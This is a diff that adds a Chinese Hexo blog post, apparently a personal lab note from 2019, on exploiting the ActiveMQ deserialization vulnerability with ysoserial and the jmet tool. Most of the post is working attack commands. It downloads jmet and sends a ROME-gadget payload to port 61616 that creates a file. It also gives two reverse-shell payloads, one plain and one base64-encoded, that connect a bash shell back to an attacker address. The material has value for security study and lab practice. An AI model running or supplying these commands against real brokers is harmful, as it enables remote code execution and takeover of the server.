@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Activemq反序列化漏洞 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post--untitled 2" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Activemq反序列化漏洞
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/21/-untitled 2/" class="article-date">
+  <time datetime="2019-07-21T15:22:40.498Z" itemprop="datePublished">2019-07-21</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h1 id="Activemq反序列化漏洞"><a href="#Activemq反序列化漏洞" class="headerlink" title="Activemq反序列化漏洞"></a>Activemq反序列化漏洞</h1><p>##1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>2.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>cd /opt<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCE509542dc5dcc6d27629012878eda031d/2222" alt></p>
+<p>###bash -i &gt;&amp;/dev/tcp/192.168.199.117/1314 0&gt;&amp;1<br>3.执行命令（IP为攻击者IP）<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME   192.168.199.120   61616<br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCEc3c6b203668ec7c18f18e7f9373a4141/2227" alt><br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCE311fefafba5c1d6195a8f429d91e0fd8/2230" alt></p>
+<p>####执行完命令看对应的号有没有，点击进去<br>然后反弹shell，开两台虚拟机。把红色的字体进行bes64编码，如下第二个命令，用另一个虚拟机监听<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.117/12340&gt;&amp;1” -Yp ROME 192.168.199.120   61616<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTk5LjExNy8xMzE0IDA+JjEK}|{base64,-d}|{bash,-i}” -Yp ROME   192.168.199.120   61616<br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCE2cbda08693d9ae05431e5f5df49603b1/2240" alt><br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCE657525900d7ae8d348fa1c451d36c004/2242" alt><br><img src="https://note.youdao.com/yws/public/resource/d328efb8c91cae287564e2b9457e4bf8/xmlnote/WEBRESOURCE2bd7ef0e75eab9d4aaedac7646238d01/2244" alt><br>如图，根据号码找到对应的码，那边要提前监听，要点击码，进入才能监听到。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/21/-untitled 2/" data-id="cjyd4kap40002c4v6hj321fgj"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/07/21/-untitled/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title"></div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
